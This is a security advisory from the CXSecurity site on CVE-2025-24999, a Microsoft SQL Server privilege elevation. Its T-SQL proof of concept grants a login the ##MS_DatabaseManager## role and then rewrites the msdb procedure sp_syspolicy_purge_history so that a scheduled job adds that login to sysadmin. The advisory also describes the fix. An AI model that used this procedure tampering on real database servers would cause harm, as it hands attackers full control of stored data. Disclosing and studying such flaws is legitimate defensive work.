---
title: Microsoft SQL Server Privilege Elevation Through
url: https://cxsecurity.com/issue/WLB-2026040001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-03
fetch_date: 2026-04-04T04:10:22.597531
---

# Microsoft SQL Server Privilege Elevation Through

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft SQL Server Privilege Elevation Through** **2026.04.03**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-24999](https://cxsecurity.com/cveshow/CVE-2025-24999/ "Click to see CVE-2025-24999")**  CWE: **N/A** | |

Title: Microsoft SQL Server Privilege Elevation Through ##MS\_DatabaseManager## Role [CVE-2025-24999]
Product: Database
Manufacturer: Microsoft
Affected Version(s): SQL Server 2022,2025
Tested Version(s): SQL Server 2022,2025
Risk Level: High
Solution Status: Fixed
CVE Reference: CVE-2025-24999
Base Score: 8.8
Author of Advisory: Emad Al-Mousa
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Introduction:
Privilege elevation against database systems represents a critical security threat because the database system stores your organization’s “jewels”…your sensitive data. Once an attacker elevates their account permissions this will enable them to view confidential data, implant malicious code, or cause denial of a service. Unfortunately, SQL Server database technology is prone to privilege elevation attacks, I am documenting all possible attack exploit techniques in this unified article blog reference (and will continue to do so in the future): https://medium.com/@emad.mousa.83/microsoft-sql-server-privilege-escalation-elevation-exploits-proof-of-concpet-80fb1e45699b
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
In this simulation please use SQL Server Management Studio client tool to run the SQL queries. Also, access SQL Server Management Studio with an account granted SYSADMIN role as a DBA.
I will create a database login account and will name it “acc2” with the password “acc2” and grant this account the new server role ##MS\_DatabaseManager##:
USE [master]
GO
CREATE LOGIN [acc2] WITH PASSWORD=N'acc2', DEFAULT\_DATABASE=[master], CHECK\_EXPIRATION=OFF, CHECK\_POLICY=OFF
GO
ALTER SERVER ROLE [##MS\_DatabaseManager##] ADD MEMBER [acc2]
GO
When accessing with the database login “acc2” you can perform create,aleter,drop any database in the SQL Server Instance as expected.
To Verify This, execute the following sql query as account “acc2”:
select SUSER\_NAME() as Myname,\* from sys.fn\_my\_permissions(NULL,NULL);
GO
Now, the “exploit” part of the security vulnerability to escalate to SYSADMIN.
Right click on the MSDB database and choose “New Query”:
Then run the following SQL code that will modify a system stored procedure sp\_syspolicy\_purge\_history code to grant acc2 account SYSADMIN role:
ALTER PROCEDURE [dbo].[sp\_syspolicy\_purge\_history]
AS
BEGIN
ALTER SERVER ROLE [sysadmin] ADD MEMBER [acc2]
END
Which consequently will elevate my permission to sysadmin role when the standard and default job syspolicy\_purge\_history gets executed as scheduled. The job syspolicy\_purge\_history exists in ALL instillations of SQL Server database engines by default.
For the sake of simulation in your SQL Server Management Studio with account granted SYSADMIN role (your DBA ccount) run the job manually and after that refresh your database connection of acc2 account….you will see that you are now granted SYSADMIN ROLE !!
After applying security update released in August 2025 KB5063756, Microsoft fix was to use certificate based account (with low-permission) and change the job T-SQL execution code as follows:
EXECUTE AS LOGIN = '##MS\_PolicyTsqlExecutionLogin##' WITH NO REVERT;
EXEC msdb.dbo.sp\_syspolicy\_purge\_history
So, even if the procedure code is changed….it will run wit the power of the low-permission certificate account ##MS\_PolicyTsqlExecutionLogin##
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\* Remarks and Conclusions:
- clear steps of exploit and further analysis , and attack methods are documented here: https://databasesecurityninja.wordpress.com/2026/04/02/microsoft-sql-server-privilege-elevation-through-ms\_databasemanager-role-cve-2025-24999/
- ##MS\_DatabaseManager## Server Level Role can still be abused for privilege elevation, so you will need to implement defence in-depth tactics for protection.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24999
https://nvd.nist.gov/vuln/detail/CVE-2025-24999
https://databasesecurityninja.wordpress.com/2026/04/02/microsoft-sql-server-privilege-elevation-through-ms\_databasemanager-role-cve-2025-24999/
https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17

**##### References:**

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24999

https://nvd.nist.gov/vuln/detail/CVE-2025-24999

https://databasesecurityninja.wordpress.com/2026/04/02/microsoft-sql-server-privilege-elevation-through-ms\_databasemanager-role-cve-2025-24999/

https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top